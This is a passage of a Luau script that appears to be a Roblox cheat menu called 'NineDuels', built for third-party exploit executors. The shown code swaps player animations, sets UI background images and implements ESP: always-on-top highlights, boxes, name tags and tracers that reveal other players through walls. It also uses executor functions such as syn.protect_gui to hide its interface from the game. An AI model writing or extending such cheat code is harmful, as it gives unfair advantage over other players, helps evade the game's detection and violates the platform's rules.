						DROP_ASCEND_SPEED = 150
						_GuiKeys = nil
						animEnabled = false
						tryardAnimEnabled = false
						saturationEnabled = false

						do
							local colorCorrectionEffect = nil

							applySaturation = function(arg)
								saturationEnabled = arg and true or false

								if not colorCorrectionEffect or not colorCorrectionEffect.Parent then
									colorCorrectionEffect = Instance.new("ColorCorrectionEffect")
									colorCorrectionEffect.Name = "NineDuelsSaturation"
									colorCorrectionEffect.Parent = Lighting
								end

								colorCorrectionEffect.Enabled = saturationEnabled
								colorCorrectionEffect.Saturation = saturationEnabled and 1 or 0
								colorCorrectionEffect.Contrast = saturationEnabled and 0.18 or 0
								colorCorrectionEffect.Brightness = saturationEnabled and 0.1 or 0
							end
						end
					end

					espEnabled = false
					espShowName = true
					espShowHealth = true
					espShowDistance = true
					espShowSpeed = true
					espShowHighlight = true
					espShowTracer = false
					espUnderFeet = false
					espActive = false
					espBBs = {}
					espHighlights = {}
					espTracerGui = nil
					espTracers = {}
					backgroundEnabled = true
					backgroundIndex = 1
					bgImageRef = nil

					BG_IMAGES = {
						[1] = "124032391231470",
						[2] = "0",
						[3] = "107957242975210",
						[4] = "95569854404781",
						[5] = "0",
						[6] = "0",
					}

					ALLOWED_IMAGE_INDICES = { 1, 2, 3, 4, 5, 6 }

					fn29 = function(arg)
						return arg == 1 or arg == 2 or arg == 3 or arg == 4 or arg == 5 or arg == 6
					end

					decalCache = {}

					local fetchRealImage = function(arg)
						local num = tonumber(arg)
						if not num then
							return arg
						end

						if decalCache[num] then
							return decalCache[num]
						end

						local ok, result = pcall(function()
							return game:GetObjects("rbxassetid://" .. num)
						end)

						if ok and type(result) == "table" and result[1] then
							local v86 = result[1]

							if v86:IsA("Decal") then
								local texture = v86.Texture

								pcall(function()
									v86:Destroy()
								end)

								if texture and texture ~= "" then
									local v87 = string.match(texture, "id=(%d+)") or string.match(texture, "%d+$")
									if v87 then
										decalCache[num] = v87
										return v87
									end
								end
							end
						end

						local ok2, result2 = pcall(function()
							return game:HttpGet(
								"https://thumbnails.roblox.com/v1/assets?assetIds=" .. num .. "&size=420x420&format=Png"
							)
						end)

						if ok2 and result2 then
							local v86 = string.match(result2, '"imageUrl"%s*:%s*"([^"]+)"')
							if v86 then
								decalCache[num] = v86
								return v86
							end
						end

						return arg
					end

					local pendingImages = {}
					getRealImage = function(arg)
						local num = tonumber(arg)
						if not num or num <= 0 then
							return arg
						end
						if decalCache[num] then
							return decalCache[num]
						end
						if pendingImages[num] then
							while pendingImages[num] do
								task.wait()
							end
							return decalCache[num] or arg
						end
						pendingImages[num] = true
						local cacheFile = "NineDuelsV1configLOL1/img_" .. num .. ".txt"
						local cached = nil
						pcall(function()
							if isfile and readfile and isfile(cacheFile) then
								cached = readfile(cacheFile)
							end
						end)
						if cached and cached ~= "" then
							decalCache[num] = cached
							pendingImages[num] = nil
							return cached
						end
						local ok, result = pcall(fetchRealImage, arg)
						result = ok and result or arg
						decalCache[num] = result
						if result ~= arg and writefile then
							pcall(writefile, cacheFile, tostring(result))
						end
						pendingImages[num] = nil
						return result
					end

					setImage = function(arg, arg2)
						if not arg then
							return
						end

						task.spawn(function()
							local v86 = getRealImage(arg2)

							if tostring(v86):sub(1, 4) == "http" then
								arg.Image = v86
							else
								arg.Image = "rbxassetid://" .. v86
							end
						end)
					end

					applyBackgroundImage = function(arg)
						local num = tonumber(arg) or 0
						backgroundIndex = fn29(num) and num or 0
						if not bgImageRef then
							return
						end

						if backgroundIndex == 0 then
							bgImageRef.Visible = false
							backgroundEnabled = false

							if GuiRefs and GuiRefs.dimOverlay then
								GuiRefs.dimOverlay.Visible = false
							end
						else
							setImage(bgImageRef, BG_IMAGES[backgroundIndex])
							bgImageRef.Visible = true
							backgroundEnabled = true

							if GuiRefs and GuiRefs.dimOverlay then
								GuiRefs.dimOverlay.Visible = true
							end
						end
					end

					sideBtnBgIndex = 1
					sideBtnBgImageRefs = {}
					sideBtnBgClipRefs = {}
					sideBtnDarkOverlayRefs = {}
					stealBarBgIndex = 1
					stealBarBgImageRef = nil
					stealBarBgOverlayRef = nil

					do
						local n32 = 0
						local v86 = 0

						local function fn37(arg, arg2, arg3, arg4)
							if not arg then
								return
							end

							task.spawn(function()
								local v87 = getRealImage(arg2)
								if arg4() ~= arg3 or not arg.Parent then
									return
								end

								if tostring(v87):sub(1, 4) == "http" then
									arg.Image = v87
								else
									arg.Image = "rbxassetid://" .. v87
								end
							end)
						end

						applyStealBarBgImage = function(arg)
							n32 += 1
							local v87 = n32
							local n33 = tonumber(arg) or 0
							stealBarBgIndex = fn29(n33) and n33 or 0

							if stealBarBgImageRef then
								stealBarBgImageRef.Visible = false

								if stealBarBgIndex > 0 then
									fn37(stealBarBgImageRef, BG_IMAGES[stealBarBgIndex], v87, function()
										return n32
									end)

									if v87 == n32 then
										stealBarBgImageRef.Visible = true
									end
								end
							end

							if stealBarBgOverlayRef then
								stealBarBgOverlayRef.Visible = stealBarBgIndex > 0
							end
						end

						fn30 = function() end

						applySideButtonBgImage = function(arg)
							v86 += 1
							local v87 = v86
							local n33 = tonumber(arg) or 0
							sideBtnBgIndex = fn29(n33) and n33 or 0

							for _, v88 in ipairs(sideBtnBgImageRefs) do
								v88.Visible = false

								if sideBtnBgIndex > 0 then
									fn37(v88, BG_IMAGES[sideBtnBgIndex], v87, function()
										return v86
									end)

									if v87 == v86 then
										v88.Visible = true
									end
								end
							end

							for _, v88 in ipairs(sideBtnDarkOverlayRefs) do
								v88.Visible = sideBtnBgIndex > 0
							end
						end
					end
				end

				do
					local localPlayer, fn37

					do
						RembembiAnims = {
							WalkAnim = 73718308412641,
							RunAnim = 135515454877967,
							JumpAnim = 0,
							FallAnim = 78147885297412,
							SwimIdle = 129183123083281,
							Swim = 110657013921774,
							ClimbAnim = 129447497744818,
							Animation1 = 92849173543269,
							Animation2 = 132238900951109,
						}

						AnimRefs = {
							heartbeat = nil,
							savedAnimate = nil,
							originalAnims = nil,
						}

						startAnimToggle = nil
						stopAnimToggle = nil
						localPlayer = Players.LocalPlayer

						do
							local function fn38(arg)
								if not arg then
									return false
								end

								for _, v86 in pairs(RembembiAnims) do
									if v86 == arg then
										return true
									end
								end

								return false
							end

							fn37 = function(arg)
								local animate = arg:FindFirstChild("Animate")
								if not animate then
									return
								end

								local function fn39(arg2)
									return arg2 and arg2.AnimationId or nil
								end

								local originalAnims = {
									walk = fn39(animate.walk and animate.walk.WalkAnim),
									run = fn39(animate.run and animate.run.RunAnim),
									jump = fn39(animate.jump and animate.jump.JumpAnim),
									fall = fn39(animate.fall and animate.fall.FallAnim),
									climb = fn39(animate.climb and animate.climb.ClimbAnim),
									swim = fn39(animate.swim and animate.swim.Swim),
									swimidle = fn39(animate.swimidle and animate.swimidle.SwimIdle),
									idle1 = fn39(animate.idle and animate.idle.Animation1),
									idle2 = fn39(animate.idle and animate.idle.Animation2),
								}

								if not fn38(originalAnims.walk) then
									AnimRefs.originalAnims = originalAnims
								end
							end
						end
					end

					do
						local function fn38(arg)
							local animate = arg:FindFirstChild("Animate")
							if not animate then
								return
							end

							local function fn39(arg2, arg3)
								if arg2 then
									arg2.AnimationId = "rbxassetid://" .. arg3
								end
							end

							fn39(animate.walk and animate.walk.WalkAnim, RembembiAnims.WalkAnim)
							fn39(animate.run and animate.run.RunAnim, RembembiAnims.RunAnim)
							fn39(animate.jump and animate.jump.JumpAnim, RembembiAnims.JumpAnim)
							fn39(animate.fall and animate.fall.FallAnim, RembembiAnims.FallAnim)
							fn39(animate.climb and animate.climb.ClimbAnim, RembembiAnims.ClimbAnim)
							fn39(animate.swim and animate.swim.Swim, RembembiAnims.Swim)
							fn39(animate.swimidle and animate.swimidle.SwimIdle, RembembiAnims.SwimIdle)
							fn39(animate.idle and animate.idle.Animation1, RembembiAnims.Animation1)
							fn39(animate.idle and animate.idle.Animation2, RembembiAnims.Animation2)
						end

						local function fn39(arg)
							local originalAnims = AnimRefs.originalAnims
							if not originalAnims then
								return
							end
							local animate = arg:FindFirstChild("Animate")
							if not animate then
								return
							end

							local function fn40(arg2, animationId)
								if arg2 and animationId then
									arg2.AnimationId = animationId
								end
							end

							fn40(animate.walk and animate.walk.WalkAnim, originalAnims.walk)
							fn40(animate.run and animate.run.RunAnim, originalAnims.run)
							fn40(animate.jump and animate.jump.JumpAnim, originalAnims.jump)
							fn40(animate.fall and animate.fall.FallAnim, originalAnims.fall)
							fn40(animate.climb and animate.climb.ClimbAnim, originalAnims.climb)
							fn40(animate.swim and animate.swim.Swim, originalAnims.swim)
							fn40(animate.swimidle and animate.swimidle.SwimIdle, originalAnims.swimidle)
							fn40(animate.idle and animate.idle.Animation1, originalAnims.idle1)
							fn40(animate.idle and animate.idle.Animation2, originalAnims.idle2)
						end

						startAnimToggle = function()
							if AnimRefs.heartbeat then
								AnimRefs.heartbeat:Disconnect()
								AnimRefs.heartbeat = nil
							end

							local character = localPlayer.Character

							if character then
								fn37(character)
								fn38(character)
							end

							AnimRefs.heartbeat = RunService.Heartbeat:Connect(function()
								if not animEnabled then
									return
								end
								local character2 = localPlayer.Character

								if character2 then
									fn38(character2)
								end
							end)
						end

						stopAnimToggle = function()
							if AnimRefs.heartbeat then
								AnimRefs.heartbeat:Disconnect()
								AnimRefs.heartbeat = nil
							end

							local character = localPlayer.Character

							if character then
								fn39(character)
							end
						end
					end
				end

				do
					local fn37

					do
						TryardAnims = {
							idle1 = "rbxassetid://133806214992291",
							idle2 = "rbxassetid://94970088341563",
							walk = "rbxassetid://707897309",
							run = "rbxassetid://707861613",
							jump = "rbxassetid://116936326516985",
							fall = "rbxassetid://116936326516985",
							climb = "rbxassetid://116936326516985",
							swim = "rbxassetid://116936326516985",
							swimidle = "rbxassetid://116936326516985",
						}

						_G._phantomTryardConn = nil
						_G._phantomOrigAnims = nil

						do
							local function fn38(arg)
								if not arg then
									return false
								end

								for _, v86 in pairs(TryardAnims) do
									if v86 == arg then
										return true
									end
								end

								return false
							end

							fn37 = function(arg)
								local animate = arg:FindFirstChild("Animate")
								if not animate then
									return
								end

								local function fn39(arg2)
									return arg2 and arg2.AnimationId or nil
								end

								local phantomOrigAnims = {
									idle1 = fn39(animate.idle and animate.idle.Animation1),
									idle2 = fn39(animate.idle and animate.idle.Animation2),
									walk = fn39(animate.walk and animate.walk.WalkAnim),
									run = fn39(animate.run and animate.run.RunAnim),
									jump = fn39(animate.jump and animate.jump.JumpAnim),
									fall = fn39(animate.fall and animate.fall.FallAnim),
									climb = fn39(animate.climb and animate.climb.ClimbAnim),
									swim = fn39(animate.swim and animate.swim.Swim),
									swimidle = fn39(animate.swimidle and animate.swimidle.SwimIdle),
								}

								if not fn38(phantomOrigAnims.walk) then
									_G._phantomOrigAnims = phantomOrigAnims
								end
							end
						end
					end

					do
						local function fn38(arg)
							local animate = arg:FindFirstChild("Animate")
							if not animate then
								return
							end

							local function fn39(arg2, animationId)
								if arg2 then
									arg2.AnimationId = animationId
								end
							end

							fn39(animate.idle and animate.idle.Animation1, TryardAnims.idle1)
							fn39(animate.idle and animate.idle.Animation2, TryardAnims.idle2)
							fn39(animate.walk and animate.walk.WalkAnim, TryardAnims.walk)
							fn39(animate.run and animate.run.RunAnim, TryardAnims.run)
							fn39(animate.jump and animate.jump.JumpAnim, TryardAnims.jump)
							fn39(animate.fall and animate.fall.FallAnim, TryardAnims.fall)
							fn39(animate.climb and animate.climb.ClimbAnim, TryardAnims.climb)
							fn39(animate.swim and animate.swim.Swim, TryardAnims.swim)
							fn39(animate.swimidle and animate.swimidle.SwimIdle, TryardAnims.swimidle)
						end

						startTryardAnim = function()
							if _G._phantomTryardConn then
								_G._phantomTryardConn:Disconnect()
							end

							local character = LP.Character

							if character then
								fn37(character)
								fn38(character)
								local humanoid = character:FindFirstChildOfClass("Humanoid")

								if humanoid then
									for _, v86 in ipairs(humanoid:GetPlayingAnimationTracks()) do
										v86:Stop(0)
									end

									humanoid:ChangeState(Enum.HumanoidStateType.Running)
								end
							end

							_G._phantomTryardConn = RunService.Heartbeat:Connect(function()
								if not tryardAnimEnabled then
									return
								end
								local character2 = LP.Character

								if character2 then
									fn38(character2)
								end
							end)
						end
					end
				end
			end
		end

		do
			do
				local fn35

				do
					stopTryardAnim = function()
						if _G._phantomTryardConn then
							_G._phantomTryardConn:Disconnect()
							_G._phantomTryardConn = nil
						end

						local character = LP.Character

						if character and _G._phantomOrigAnims then
							local animate = character:FindFirstChild("Animate")

							if animate then
								local function fn36(arg, animationId)
									if arg and animationId then
										arg.AnimationId = animationId
									end
								end

								local phantomOrigAnims = _G._phantomOrigAnims
								fn36(animate.idle and animate.idle.Animation1, phantomOrigAnims.idle1)
								fn36(animate.idle and animate.idle.Animation2, phantomOrigAnims.idle2)
								fn36(animate.walk and animate.walk.WalkAnim, phantomOrigAnims.walk)
								fn36(animate.run and animate.run.RunAnim, phantomOrigAnims.run)
								fn36(animate.jump and animate.jump.JumpAnim, phantomOrigAnims.jump)
								fn36(animate.fall and animate.fall.FallAnim, phantomOrigAnims.fall)
								fn36(animate.climb and animate.climb.ClimbAnim, phantomOrigAnims.climb)
								fn36(animate.swim and animate.swim.Swim, phantomOrigAnims.swim)
								fn36(animate.swimidle and animate.swimidle.SwimIdle, phantomOrigAnims.swimidle)
							end
						end
					end

					WalkAnimationPacks = {
						["Adidas Aura"] = {
							WalkAnim = 83842218823011,
							RunAnim = 0,
							JumpAnim = 109996626521204,
							FallAnim = 95603166884636,
							SwimIdle = 94922130551805,
							Swim = 134530128383903,
							Animation1 = 110211186840347,
							Animation2 = 114191137265065,
							ClimbAnim = 97824616490448,
						},
						["Adidas Sports"] = {
							WalkAnim = 18537392113,
							RunAnim = 0,
							JumpAnim = 0,
							FallAnim = 18537367238,
							SwimIdle = 0,
							Swim = 18537389531,
							Animation1 = 18537376492,
							Animation2 = 0,
							ClimbAnim = 18537363391,
						},
						["Adidas Community"] = {
							WalkAnim = 122150855457006,
							RunAnim = 82598234841035,
							JumpAnim = 75290611992385,
							FallAnim = 0,
							SwimIdle = 109346520324160,
							Swim = 133308483266208,
							Animation1 = 122257458498464,
							Animation2 = 102357151005774,
							ClimbAnim = 0,
						},
						["Wicked Popular"] = {
							WalkAnim = 92072849924640,
							RunAnim = 0,
							JumpAnim = 104325245285198,
							FallAnim = 121152442762481,
							Animation1 = 118832222982049,
							ClimbAnim = 131326830509784,
							SwimIdle = 113199415118199,
							Swim = 99384245425157,
							Animation2 = 76049494037641,
						},
						Elder = {
							WalkAnim = 10921111375,
							RunAnim = 10921104374,
							JumpAnim = 0,
							FallAnim = 10921105765,
							SwimIdle = 10921110146,
							Swim = 0,
							ClimbAnim = 10921100400,
							Animation1 = 10921101664,
							Animation2 = 0,
						},
						Zombie = {
							WalkAnim = 10921355261,
							RunAnim = 616163682,
							JumpAnim = 0,
							FallAnim = 10921350320,
							SwimIdle = 10921353442,
							Swim = 0,
							Animation1 = 10921344533,
							Animation2 = 10921345304,
							ClimbAnim = 10921343576,
						},
						Mage = {
							WalkAnim = 10921152678,
							RunAnim = 10921148209,
							JumpAnim = 10921149743,
							FallAnim = 0,
							SwimIdle = 10921151661,
							Swim = 10921150788,
							ClimbAnim = 0,
							Animation1 = 10921144709,
							Animation2 = 10921145797,
						},
						["Catwalk Glam"] = {
							WalkAnim = 0,
							RunAnim = 81024476153754,
							JumpAnim = 0,
							FallAnim = 92294537340807,
							SwimIdle = 98854111361360,
							Swim = 134591743181628,
							ClimbAnim = 119377220967554,
							Animation1 = 133806214992291,
							Animation2 = 94970088341563,
						},
					}

					WalkAnimationOrder = {
						"Adidas Aura",
						"Adidas Sports",
						"Adidas Community",
						"Wicked Popular",
						"Elder",
						"Zombie",
						"Mage",
						"Catwalk Glam",
					}

					do
						local function fn36(arg)
							return arg and arg.AnimationId or nil
						end

						fn35 = function(arg)
							local animate = arg and arg:FindFirstChild("Animate")
							if not animate then
								return
							end

							local function fn37(arg2)
								return fn36(arg2)
							end

							_walkOriginalAnims = {
								idle1 = fn37(animate.idle and animate.idle.Animation1),
								idle2 = fn37(animate.idle and animate.idle.Animation2),
								walk = fn37(animate.walk and animate.walk.WalkAnim),
								run = fn37(animate.run and animate.run.RunAnim),
								jump = fn37(animate.jump and animate.jump.JumpAnim),
								fall = fn37(animate.fall and animate.fall.FallAnim),
								climb = fn37(animate.climb and animate.climb.ClimbAnim),
								swim = fn37(animate.swim and animate.swim.Swim),
								swimidle = fn37(animate.swimidle and animate.swimidle.SwimIdle),
							}

							_walkOriginalChar = arg
						end
					end
				end

				do
					local function fn36(arg, arg2)
						local animate = arg and arg:FindFirstChild("Animate")
						local v86 = WalkAnimationPacks[arg2 or selectedWalkAnimation]
						if not animate or not v86 then
							return
						end

						if _walkOriginalChar ~= arg then
							fn35(arg)
						end

						local function fn37(arg3, arg4)
							if arg3 and arg4 then
								arg3.AnimationId = "rbxassetid://" .. tostring(arg4)
							end
						end

						fn37(animate.idle and animate.idle.Animation1, v86.Animation1)
						fn37(animate.idle and animate.idle.Animation2, v86.Animation2)
						fn37(animate.walk and animate.walk.WalkAnim, v86.WalkAnim)
						fn37(animate.run and animate.run.RunAnim, v86.RunAnim)
						fn37(animate.jump and animate.jump.JumpAnim, v86.JumpAnim)
						fn37(animate.fall and animate.fall.FallAnim, v86.FallAnim)
						fn37(animate.climb and animate.climb.ClimbAnim, v86.ClimbAnim)
						fn37(animate.swim and animate.swim.Swim, v86.Swim)
						fn37(animate.swimidle and animate.swimidle.SwimIdle, v86.SwimIdle)
					end

					applyWalkAnimationPack = function(arg)
						if arg and WalkAnimationPacks[arg] then
							selectedWalkAnimation = arg
						end

						if not walkAnimationsEnabled then
							restoreWalkAnimationPack()
							return
						end

						if walkAnimationConn then
							walkAnimationConn:Disconnect()
							walkAnimationConn = nil
						end

						local character = LP.Character

						if character then
							fn36(character, selectedWalkAnimation)
						end

						walkAnimationConn = RunService.Heartbeat:Connect(function()
							local character2 = LP.Character

							if character2 then
								fn36(character2, selectedWalkAnimation)
							end
						end)
					end
				end
			end

			restoreWalkAnimationPack = function()
				if walkAnimationConn then
					walkAnimationConn:Disconnect()
					walkAnimationConn = nil
				end

				local character = LP.Character
				local animate = character and character:FindFirstChild("Animate")
				local v86 = _walkOriginalAnims

				if animate and v86 and _walkOriginalChar == character then
					local function fn35(arg, animationId)
						if arg and animationId then
							arg.AnimationId = animationId
						end
					end

					fn35(animate.idle and animate.idle.Animation1, v86.idle1)
					fn35(animate.idle and animate.idle.Animation2, v86.idle2)
					fn35(animate.walk and animate.walk.WalkAnim, v86.walk)
					fn35(animate.run and animate.run.RunAnim, v86.run)
					fn35(animate.jump and animate.jump.JumpAnim, v86.jump)
					fn35(animate.fall and animate.fall.FallAnim, v86.fall)
					fn35(animate.climb and animate.climb.ClimbAnim, v86.climb)
					fn35(animate.swim and animate.swim.Swim, v86.swim)
					fn35(animate.swimidle and animate.swimidle.SwimIdle, v86.swimidle)
				end
			end

			do
				local v86 = nil
				local v87 = nil
				local v88 = nil
				local connection = nil

				clearSelfESP = function()
					if connection then
						connection:Disconnect()
						connection = nil
					end

					if v86 then
						pcall(function()
							v86:Destroy()
						end)

						v86 = nil
					end

					if v87 then
						pcall(function()
							v87:Destroy()
						end)

						v87 = nil
					end

					if v88 then
						pcall(function()
							v88:Destroy()
						end)

						v88 = nil
					end

					local character = LP.Character

					if character then
						for _, v89 in ipairs({ "NineDuelsSelfESP", "NineDuelsSelfBoxESP" }) do
							local v90 = character:FindFirstChild(v89)

							if v90 then
								pcall(function()
									v90:Destroy()
								end)
							end
						end
					end
				end

				applySelfESP = function(arg)
					selfEspEnabled = arg and true or false
					clearSelfESP()
					if not (selfEspEnabled or selfBoxEspEnabled) then
						return
					end
					local character = LP.Character
					if not character then
						return
					end

					if selfEspEnabled then
						local instance = Instance.new("Highlight")
						instance.Name = "NineDuelsSelfESP"
						instance.Adornee = character
						instance.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						instance.FillColor = Color3.fromRGB(220, 220, 220)
						instance.FillTransparency = 0.88
						instance.OutlineColor = Color3.fromRGB(255, 255, 255)
						instance.OutlineTransparency = 0.05
						instance.Parent = character
						v86 = instance
					end

					if selfBoxEspEnabled then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart then
							local part = Instance.new("Part")
							part.Name = "AntiFling"
							part.Size = Vector3.new(4.2, 5.8, 2.6)
							part.Transparency = 1
							part.CanCollide = false
							part.CanTouch = false
							part.CanQuery = false
							part.Massless = true
							part.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0.28, 0)
							part.Parent = character
							local weldConstraint = Instance.new("WeldConstraint")
							weldConstraint.Part0 = humanoidRootPart
							weldConstraint.Part1 = part
							weldConstraint.Parent = part
							local selectionBox = Instance.new("SelectionBox")
							selectionBox.Name = "NineDuelsSelfBoxESP"
							selectionBox.Adornee = part
							selectionBox.Color3 = Color3.fromRGB(220, 220, 220)
							selectionBox.LineThickness = 0.035
							selectionBox.SurfaceTransparency = 1
							selectionBox.Parent = character
							v88 = part
							v87 = selectionBox
						end
					end

					connection = RunService.RenderStepped:Connect(function()
						if not (v86 and v86.Parent or v87 and v87.Parent) then
							if connection then
								connection:Disconnect()
								connection = nil
							end

							return
						end

						local n32 = (math.sin(tick() * 2.4) + 1) * 0.5
						local color = Color3.fromRGB(
							220 + math.floor(35 * n32),
							60 + math.floor(60 * n32),
							48 + math.floor(65 * n32)
						)

						if v86 then
							v86.OutlineColor = color
							v86.FillTransparency = 0.91 - n32 * 0.3
						end

						if v87 then
							v87.Color3 = color
							v87.LineThickness = 0.025 + n32 * 0.05
						end
					end)
				end
			end
		end

		applySelfBoxESP = function(arg)
			selfBoxEspEnabled = arg and true or false
			applySelfESP(selfEspEnabled)
		end

		LP.CharacterAdded:Connect(function()
			task.wait(0.6)

			if selfEspEnabled or selfBoxEspEnabled then
				applySelfESP(selfEspEnabled)
			end
		end)

		do
			local color = Color3.fromRGB(210, 210, 210)
			local color2 = Color3.fromRGB(235, 235, 235)
			local color3 = Color3.fromRGB(255, 255, 255)
			local color4 = Color3.fromRGB(245, 245, 245)
			local color5 = Color3.fromRGB(255, 255, 255)

			local function fn35()
				pcall(function()
					local currentCamera = workspace.CurrentCamera
					currentCamera = currentCamera and currentCamera:FindFirstChild("NineDuelsESPVisuals")

					if currentCamera then
						currentCamera:Destroy()
					end

					local hui = gethui and gethui() or game:GetService("CoreGui")
					local nineDuelsESPTracers = hui and hui:FindFirstChild("NineDuelsESPTracers")

					if nineDuelsESPTracers then
						nineDuelsESPTracers:Destroy()
					end

					local playerGui = LP:FindFirstChildOfClass("PlayerGui")
					playerGui = playerGui and playerGui:FindFirstChild("NineDuelsESPTracers")

					if playerGui then
						playerGui:Destroy()
					end

					for _, player_ in ipairs(Players:GetPlayers()) do
						local character = player_.Character
						local nineDuelsPlayerHighlightMarker = character
							and character:FindFirstChild("NineDuelsPlayerHighlightMarker")

						if nineDuelsPlayerHighlightMarker then
							nineDuelsPlayerHighlightMarker:Destroy()
						end
					end
				end)
			end

			fn35()

			fn31 = function(arg)
				local v86 = espHighlights[arg]

				if v86 then
					pcall(function()
						v86.fill:Destroy()
					end)

					pcall(function()
						v86.outline:Destroy()
					end)

					pcall(function()
						v86.thick:Destroy()
					end)

					pcall(function()
						if v86.marker and v86.marker.Name == "NineDuelsPlayerHighlightMarker" then
							v86.marker:Destroy()
						end
					end)

					espHighlights[arg] = nil
				end
			end

			fn32 = function(arg, parent)
				if not (espActive and espShowHighlight) or arg == LP or not parent then
					return
				end
				local v86 = parent:FindFirstChild("HumanoidRootPart")
				if not v86 then
					return
				end
				fn31(arg)
				local part = Instance.new("Part")
				part.Name = "NineDuelsPlayerHighlightMarker"
				part.Size = Vector3.new(4.5, 5.35, 2.25)
				part.CFrame = v86.CFrame
				part.Transparency = 0.5
				part.CanCollide = false
				part.CanTouch = false
				part.CanQuery = false
				part.CastShadow = false
				part.Massless = true
				part.Parent = parent
				local instance = Instance.new("WeldConstraint")
				instance.Part0 = v86
				instance.Part1 = part
				instance.Parent = part
				local instance2 = Instance.new("Highlight")
				instance2.Name = "NineDuelsBoxESPCrimson"
				instance2.Adornee = part
				instance2.FillTransparency = 1
				instance2.OutlineColor = color2
				instance2.OutlineTransparency = 0.03
				instance2.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				instance2.Parent = part
				local highlight = Instance.new("Highlight")
				highlight.Name = "NineDuelsBoxESPWhiteGlint"
				highlight.Adornee = part
				highlight.FillTransparency = 1
				highlight.OutlineColor = color5
				highlight.OutlineTransparency = 0.96
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.Parent = part
				local selectionBox = Instance.new("SelectionBox")
				selectionBox.Name = "NineDuelsBoxESPThickCrimson"
				selectionBox.Adornee = part
				selectionBox.Color3 = color2
				selectionBox.LineThickness = 0.2
				selectionBox.SurfaceColor3 = color2
				selectionBox.SurfaceTransparency = 1
				selectionBox.Visible = true
				selectionBox.Parent = part
				espHighlights[arg] = { marker = part, fill = instance2, outline = highlight, thick = selectionBox }
			end

			removeESP = function(arg)
				if espBBs[arg] then
					pcall(function()
						espBBs[arg]:Destroy()
					end)

					espBBs[arg] = nil
				end

				if espTracers[arg] then
					pcall(function()
						espTracers[arg]:Destroy()
					end)

					espTracers[arg] = nil
				end

				fn31(arg)
			end

			buildESP = function(arg)
				if arg == LP then
					return
				end
				removeESP(arg)
				local character = arg.Character
				if not character then
					return
				end

				if not espTracerGui then
					espTracerGui = Instance.new("ScreenGui")
					espTracerGui.Name = "NineDuelsESPTracers"
					espTracerGui.ResetOnSpawn = false
					espTracerGui.IgnoreGuiInset = true
					espTracerGui.DisplayOrder = 49

					pcall(function()
						if syn and syn.protect_gui then
							syn.protect_gui(espTracerGui)
						end
					end)

					if not pcall(function()
						espTracerGui.Parent = game:GetService("CoreGui")
					end) then
						espTracerGui.Parent = LP:FindFirstChildOfClass("PlayerGui")
					end
				end

				local frame = Instance.new("Frame", espTracerGui)
				frame.Name = "Tracer_" .. arg.Name
				frame.AnchorPoint = Vector2.new(0.5, 0.5)
				frame.Size = UDim2.fromOffset(1, 1)
				frame.BackgroundColor3 = color2
				frame.BackgroundTransparency = 0.12
				frame.BorderSizePixel = 0
				frame.Visible = false
				frame.ZIndex = 1
				guiCorner(frame, 1)
				espTracers[arg] = frame
				fn32(arg, character)
				local v86 = character:FindFirstChild("Head")
				if not v86 then
					return
				end
				local instance = Instance.new("BillboardGui")
				instance.Name = "NineDuelsESP"
				instance.AlwaysOnTop = true
				instance.ResetOnSpawn = false
				instance.Size = UDim2.new(0, 150, 0, 42)
				instance.StudsOffset = Vector3.new(0, 1, 0)
				instance.Parent = v86
				espBBs[arg] = instance
				local imageLabel = Instance.new("ImageLabel", instance)
				imageLabel.Name = "PlayerAvatar"
				imageLabel.Size = UDim2.fromOffset(28, 28)
				imageLabel.Position = UDim2.fromOffset(6, 7)
				imageLabel.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
				imageLabel.BackgroundTransparency = 0.05
				imageLabel.BorderSizePixel = 0
				imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. arg.UserId .. "&w=150&h=150"
				imageLabel.ScaleType = Enum.ScaleType.Crop
				imageLabel.ZIndex = 5
				Instance.new("UICorner", imageLabel).CornerRadius = UDim.new(1, 0)
				local uiStroke = Instance.new("UIStroke", imageLabel)
				uiStroke.Color = Color3.fromRGB(220, 220, 220)
				uiStroke.Thickness = 1
				uiStroke.Transparency = 0.2
				local frame2 = Instance.new("Frame", instance)
				frame2.Size = UDim2.new(1, 0, 1, 0)
				frame2.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
				frame2.BackgroundTransparency = 0.45
				frame2.BorderSizePixel = 0
				Instance.new("UICorner", frame2).CornerRadius = UDim.new(0, 5)
				local instance2 = Instance.new("UIStroke", frame2)
				instance2.Thickness = 1
				instance2.Color = Color3.fromRGB(90, 90, 90)
				instance2.Transparency = 0.35
				local uiPadding = Instance.new("UIPadding", frame2)
				uiPadding.PaddingLeft = UDim.new(0, 38)
				uiPadding.PaddingRight = UDim.new(0, 5)
				uiPadding.PaddingTop = UDim.new(0, 3)
				uiPadding.PaddingBottom = UDim.new(0, 3)
				local uiListLayout = Instance.new("UIListLayout", frame2)
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
				uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
				uiListLayout.Padding = UDim.new(0, 2)
				local textLabel = Instance.new("TextLabel", frame2)
				textLabel.Size = UDim2.new(1, 0, 0, 13)
				textLabel.BackgroundTransparency = 1
				textLabel.Text = arg.Name
				textLabel.TextColor3 = color4
				textLabel.Font = Enum.Font.GothamBold
				textLabel.TextSize = 10
				textLabel.TextXAlignment = Enum.TextXAlignment.Center
				textLabel.TextStrokeTransparency = 0.5
				textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
				local instance3 = Instance.new("Frame", frame2)
				instance3.Size = UDim2.new(1, 0, 0, 3)
				instance3.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
				instance3.BorderSizePixel = 0
				Instance.new("UICorner", instance3).CornerRadius = UDim.new(0, 2)
				local frame3 = Instance.new("Frame", instance3)
				frame3.Size = UDim2.new(1, 0, 1, 0)
				frame3.BackgroundColor3 = color2
				frame3.BorderSizePixel = 0
				Instance.new("UICorner", frame3).CornerRadius = UDim.new(0, 2)
				local textLabel2 = Instance.new("TextLabel", frame2)
				textLabel2.Size = UDim2.new(1, 0, 0, 10)
				textLabel2.BackgroundTransparency = 1
				textLabel2.Text = ""
				textLabel2.TextColor3 = Color3.fromRGB(230, 230, 230)
